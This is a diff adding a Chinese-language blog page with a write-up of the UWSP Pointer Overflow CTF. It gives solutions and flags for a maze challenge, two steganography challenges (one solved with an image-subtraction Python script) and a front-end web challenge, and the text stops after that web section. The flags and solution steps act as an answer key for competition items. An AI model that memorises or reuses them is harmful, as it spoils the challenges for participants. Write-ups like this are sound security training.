@@ -1,0 +1,826 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.0" theme-name="Stellar" theme-version="1.29.0">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>UWSP Pointer Overflow CTF-Writeup - Joooook's Blog</title>
+
+  
+    <meta name="description" content="UWSP Pointer Overflow CTF目录 Misc Sight Without Vision Here You See A Passer By   Steg Absence Makes Hearts Go Yonder An Invincible Summer Between Secrets and Lies*   Web We Rest Upon a Single Hope Vi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UWSP Pointer Overflow CTF-Writeup">
+<meta property="og:url" content="http://example.com/2024/02/05/UWSP%20Pointer%20Overflow%20CTF/index.html">
+<meta property="og:site_name" content="Joooook&#39;s Blog">
+<meta property="og:description" content="UWSP Pointer Overflow CTF目录 Misc Sight Without Vision Here You See A Passer By   Steg Absence Makes Hearts Go Yonder An Invincible Summer Between Secrets and Lies*   Web We Rest Upon a Single Hope Vi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.04.26_h3zfbMjPSi.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.19.00_S-Mb_eQdFJ.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.30.34_kRjSKupyW_.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.31.15_Ahjb8YNnPE.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.31.48_03c5xf44WV.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2010.26.03_Wuu2E3TMrS.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2010.27.34_8s5j2Fyn0O.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.13.32_CoKeLI-uwR.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.13.51_u2mIV3JwWL.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.14.51_d7k2WvqaGr.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.15.00_k14NstQ17h.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.22.37_PqPcYTD0ky.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.48.55_j_jkKxVPWX.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.48.32__9bE5LXKXm.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.43.42_FutWFcvJN6.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2013.43.20_tz4rwZWLQ0.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.42.06_32w4N29JKy.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.40.51_ydGWcJGdLZ.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2012.53.03_C7X4R5SYIH.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2013.43.32_RJabX7PLYq.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.12.42_GCMclxgzkK.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.15.47_ywEJrkvJsy.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2015.16.40_qDVym6pTQ0.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.18.40_ke4v1_36V4.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.18.48_BkwIwBiPbz.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.20.46_XtdVNqQRrv.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.34.19_NEx9DA-aRI.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.35.36_YDBQOwsA-u.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.35.45_kME4QuImoZ.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2017.37.06_DuLAEdCbht.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.31.35_4hvrgt9Gsg.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.30.56_M4yHiv4j9D.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.31.56_tVsePQrjlp.png">
+<meta property="og:image" content="http://example.com/image/DF2_DgCWM2F3RU.jpg">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.44.53_ngwUmxRQA7.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.46.14_k9ucQa1GGZ.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.45.36_wvLwPVw1C_.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.48.46_jg_ceFIcnB.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.50.01_EwgwH03rih.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2019.52.38_RrsQ1pm3Bf.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2020.47.17_zGXIsywv26.png">
+<meta property="og:image" content="http://example.com/image/2_yqfE9reXVE.jpg">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2020.48.46_C0-2HmfbjV.png">
+<meta property="og:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2021.04.27_jlrfg9z5rZ.png">
+<meta property="article:published_time" content="2024-02-05T05:41:10.841Z">
+<meta property="article:modified_time" content="2024-02-07T12:24:05.569Z">
+<meta property="article:author" content="Joooook">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="2024">
+<meta property="article:tag" content="UWSP-CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.04.26_h3zfbMjPSi.png">
+  
+  
+  
+  <meta name="keywords" content="ctf,2024,UWSP-CTF">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.0">
+
+  
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="undefined" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">Joooook's Blog</div><div class="sub normal cap">Joooook</div><div class="sub hover cap" style="opacity:0">Per aspera ad astra</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/04/29/H264%E7%BC%96%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E5%86%99%E5%AE%9E%E8%B7%B5/"><span class="title">H264编码分析及隐写实践</span></a><a class="item title" href="/2024/04/23/GZCTF%E5%B9%B3%E5%8F%B0%E5%AF%B9%E6%8E%A5QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"><span class="title">GZCTF平台对接QQ机器人</span></a><a class="item title" href="/2024/03/22/%E7%AE%80%E6%9E%90Go%20SSTI%E5%88%A9%E7%94%A8/"><span class="title">简析Go SSTI利用</span></a><a class="item title" href="/2024/02/05/Hgame2024-Week1%20Writeup/"><span class="title">Hgame2024 Week1-Writeup</span></a><a class="item title" href="/2024/02/05/UWSP%20Pointer%20Overflow%20CTF/"><span class="title">UWSP Pointer Overflow CTF-Writeup</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Writeups/">Writeups</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-02-05T05:41:10.841Z">2024-02-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-07T12:24:05.569Z">2024-02-07</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>UWSP Pointer Overflow CTF-Writeup</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><span id="more"></span>
+<h1 id="UWSP-Pointer-Overflow-CTF"><a href="#UWSP-Pointer-Overflow-CTF" class="headerlink" title="UWSP Pointer Overflow CTF"></a>UWSP Pointer Overflow CTF</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#Misc">Misc</a><ul>
+<li><a href="#Sight-Without-Vision">Sight Without Vision</a></li>
+<li><a href="#Here-You-See-A-Passer-By">Here You See A Passer By</a></li>
+</ul>
+</li>
+<li><a href="#Steg">Steg</a><ul>
+<li><a href="#Absence-Makes-Hearts-Go-Yonder">Absence Makes Hearts Go Yonder</a></li>
+<li><a href="#An-Invincible-Summer">An Invincible Summer</a></li>
+<li><a href="#Between-Secrets-and-Lies">Between Secrets and Lies*</a></li>
+</ul>
+</li>
+<li><a href="#Web">Web</a><ul>
+<li><a href="#We-Rest-Upon-a-Single-Hope">We Rest Upon a Single Hope</a></li>
+<li><a href="#Vigil-of-the-Ceaseless-Eyes">Vigil of the Ceaseless Eyes</a></li>
+<li><a href="#Quantity-is-Not-Abundance">Quantity is Not Abundance</a></li>
+</ul>
+</li>
+<li><a href="#Crypto">Crypto</a><ul>
+<li><a href="#Unquestioned-and-Unrestrained">Unquestioned and Unrestrained</a></li>
+<li><a href="#A-Pale-Violet-Light">A Pale, Violet Light</a></li>
+<li><a href="#Missing-and-Missed">Missing and Missed</a></li>
+</ul>
+</li>
+<li><a href="#Crack">Crack</a><ul>
+<li><a href="#We-Mighty-We-Meek">We Mighty, We Meek*</a></li>
+<li><a href="#The-Gentle-Rocking-of-the-Sun">The Gentle Rocking of the Sun</a></li>
+<li><a href="#With-Desperation-and-Need">With Desperation and Need*</a></li>
+</ul>
+</li>
+<li><a href="#Reverse">Reverse</a><ul>
+<li><a href="#Easy-as-it-Gets">Easy as it Gets</a></li>
+<li><a href="#A-Tangled-Web-We-Weave">A Tangled Web We Weave</a></li>
+<li><a href="#Sunshine-on-Filth-is-Not-Polluted">Sunshine on Filth is Not Polluted</a></li>
+</ul>
+</li>
+<li><a href="#Forensics">Forensics</a><ul>
+<li><a href="#If-You-Dont-Remember-Me">If You Don’t, Remember Me</a></li>
+<li><a href="#A-Petty-Wage-in-Regret">A Petty Wage in Regret</a></li>
+<li><a href="#Better-to-Burn-in-the-Light">Better to Burn in the Light</a></li>
+</ul>
+</li>
+<li><a href="#Exploit">Exploit</a><ul>
+<li><a href="#My-Friend-A-Loathsome-Worm">My Friend, A Loathsome Worm</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Sight-Without-Vision"><a href="#Sight-Without-Vision" class="headerlink" title="Sight Without Vision"></a>Sight Without Vision</h2><h2 id="Here-You-See-A-Passer-By"><a href="#Here-You-See-A-Passer-By" class="headerlink" title="Here You See A Passer By"></a>Here You See A Passer By</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.04.26_h3zfbMjPSi.png"></p>
+<p>走迷宫</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_pr377y_bu7_p377y_bu7_pr377y&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a>Steg</h1><h2 id="Absence-Makes-Hearts-Go-Yonder"><a href="#Absence-Makes-Hearts-Go-Yonder" class="headerlink" title="Absence Makes Hearts Go Yonder"></a>Absence Makes Hearts Go Yonder</h2><p>给了gif</p>
+<p>flag在文件末尾</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.19.00_S-Mb_eQdFJ.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_h342d_y0u_7h3_f1257_71m3&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="An-Invincible-Summer"><a href="#An-Invincible-Summer" class="headerlink" title="An Invincible Summer"></a>An Invincible Summer</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.30.34_kRjSKupyW_.png"></p>
+<p>给了很多图片，每个图片都有两种格式，双图隐写考虑合并</p>
+<p>随便取两张图，在sub下看到了相对奇怪的红点</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.31.15_Ahjb8YNnPE.png"></p>
+<p>保存提取，发现明文</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2009.31.48_03c5xf44WV.png"></p>
+<p>于是写脚本来提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">file_list=[<span class="string">&#x27;CD.bmp&#x27;</span>, <span class="string">&#x27;CD.jpg&#x27;</span>, <span class="string">&#x27;bat.bmp&#x27;</span>, <span class="string">&#x27;bat.png&#x27;</span>, <span class="string">&#x27;casette.bmp&#x27;</span>, <span class="string">&#x27;casette.jpg&#x27;</span>, <span class="string">&#x27;hand.bmp&#x27;</span>, <span class="string">&#x27;hand.jpg&#x27;</span>, <span class="string">&#x27;key.bmp&#x27;</span>, <span class="string">&#x27;key.jpg&#x27;</span>, <span class="string">&#x27;lock.bmp&#x27;</span>, <span class="string">&#x27;lock.png&#x27;</span>, <span class="string">&#x27;mittens.bmp&#x27;</span>, <span class="string">&#x27;mittens.jpg&#x27;</span>, <span class="string">&#x27;rug.bmp&#x27;</span>, <span class="string">&#x27;rug.jpg&#x27;</span>, <span class="string">&#x27;tapochki.bmp&#x27;</span>, <span class="string">&#x27;tapochki.jpg&#x27;</span>, <span class="string">&#x27;vhs.bmp&#x27;</span>, <span class="string">&#x27;vhs.jpg&#x27;</span>, <span class="string">&#x27;walkman.bmp&#x27;</span>, <span class="string">&#x27;walkman.jpg&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2bytes</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">    res=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//<span class="number">8</span>):</span><br><span class="line">        res+=<span class="built_in">int</span>.to_bytes(<span class="built_in">int</span>(data[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>),<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_sub</span>(<span class="params">f1:Image.Image,f2:Image.Image,name</span>):</span><br><span class="line">    f3=Image.new(<span class="string">&#x27;1&#x27;</span>,(f1.width,f1.height))</span><br><span class="line">    ch1=f1.getchannel(<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">    ch2=f2.getchannel(<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(f1.width):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(f1.height):</span><br><span class="line">            p1=ch1.getpixel((i,j))</span><br><span class="line">            p2=ch2.getpixel((i,j))</span><br><span class="line">            pixel=(<span class="built_in">abs</span>(p1-p2))</span><br><span class="line">            f3.putpixel((i,j),pixel)</span><br><span class="line">    f3.save(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>_sub.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f=Image.<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>_sub.png&quot;</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(f.height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(f.width):</span><br><span class="line">            pixel = f.getpixel((j, i))</span><br><span class="line">            <span class="keyword">if</span> pixel == <span class="number">255</span>:</span><br><span class="line">                data += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    data=bin2bytes(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(file_list)//<span class="number">2</span>):</span><br><span class="line">    f1=Image.<span class="built_in">open</span>(file_list[i*<span class="number">2</span>])</span><br><span class="line">    f2=Image.<span class="built_in">open</span>(file_list[i*<span class="number">2</span>+<span class="number">1</span>])</span><br><span class="line">    data=image_sub(f1,f2,file_list[i*<span class="number">2</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(data.strip(<span class="string">b&#x27;\x00&#x27;</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#poctf&#123;uwsp_1_h4v3_n0_m0u7h_4nd_1_mu57_5cr34m&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2010.26.03_Wuu2E3TMrS.png"></p>
+<h2 id="Between-Secrets-and-Lies"><a href="#Between-Secrets-and-Lies" class="headerlink" title="Between Secrets and Lies*"></a>Between Secrets and Lies*</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2010.27.34_8s5j2Fyn0O.png"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="We-Rest-Upon-a-Single-Hope"><a href="#We-Rest-Upon-a-Single-Hope" class="headerlink" title="We Rest Upon a Single Hope"></a>We Rest Upon a Single Hope</h2><p>前端题</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.13.32_CoKeLI-uwR.png"></p>
+<p>跑一下就出来了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/UWSP%20Pointer%20Overflow%20CTF/%E6%88%AA%E5%B1%8F2023-11-17%2011.13.51_u2mIV3JwWL.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poctf&#123;uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l&#125;</span><br></pre></td></tr></table></figure>
+
